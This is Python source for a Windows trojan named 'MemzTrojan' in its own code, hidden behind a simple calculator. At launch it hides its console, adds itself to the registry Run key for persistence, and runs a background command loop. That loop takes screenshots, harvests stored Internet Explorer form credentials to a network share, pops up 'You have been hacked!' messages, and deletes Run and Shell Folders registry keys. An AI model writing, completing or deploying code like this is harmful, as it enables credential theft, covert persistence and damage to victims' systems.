import os
import pyautogui
from PIL import ImageGrab
import winreg
import ctypes
import sys
import threading
import socket

# Function to get the local IP address
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        print(f"Error getting local IP: {e}")
        return None

# Get the local IP address
LOCAL_IP = get_local_ip()
if LOCAL_IP is None:
    raise Exception("Could not determine local IP address")

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_path = fr'\\{LOCAL_IP}\Shared\screenshot.png'
    screenshot.save(screenshot_path)
    print(f"Screenshot saved to {screenshot_path}")

def find_passwords():
    passwords = []
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Internet Explorer\IntelliForms\Storage1") as key:
            i = 0
            while True:
                try:
                    value = winreg.EnumValue(key, i)
                    passwords.append(value[1])
                    i += 1
                except OSError:
                    break
    except FileNotFoundError:
        pass
    return passwords

def spam_popups():
    for _ in range(10):
        ctypes.windll.user32.MessageBoxW(0, "You have been hacked!", "Memz Trojan", 0)

def delete_registry_keys():
    keys_to_delete = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
    ]
    for key_path in keys_to_delete:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.DeleteKey(key, "")
            winreg.CloseKey(key)
        except FileNotFoundError:
            pass

def hide_console():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)

def persist():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "MemzTrojan", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
    winreg.CloseKey(key)

def calculator():
    print("Simple Calculator")
    print("1. Add")
    print("2. Subtract")
    print("3. Multiply")
    print("4. Divide")
    choice = int(input("Enter choice (1/2/3/4): "))
    if choice in [1, 2, 3, 4]:
        num1 = float(input("Enter first number: "))
        num2 = float(input("Enter second number: "))
        if choice == 1:
            print(f"Result: {num1 + num2}")
        elif choice == 2:
            print(f"Result: {num1 - num2}")
        elif choice == 3:
            print(f"Result: {num1 * num2}")
        elif choice == 4:
            if num2 != 0:
                print(f"Result: {num1 / num2}")
            else:
                print("Error! Division by zero.")
    else:
        print("Invalid choice")

def main():
    while True:
        command = input("Enter command (screenshot/passwords/popups/delete/exit): ")
        if command.lower() == 'screenshot':
            take_screenshot()
        elif command.lower() == 'passwords':
            passwords = find_passwords()
            password_list = "\n".join(passwords)
            password_path = fr'\\{LOCAL_IP}\Shared\passwords.txt'
            with open(password_path, "w") as f:
                f.write(password_list)
            print(f"Passwords saved to {password_path}")
        elif command.lower() == 'popups':
            spam_popups()
        elif command.lower() == 'delete':
            delete_registry_keys()
        elif command.lower() == 'exit':
            break
        else:
            print("Unknown command")

if __name__ == "__main__":
    hide_console()
    persist()
    threading.Thread(target=main).start()
    calculator()
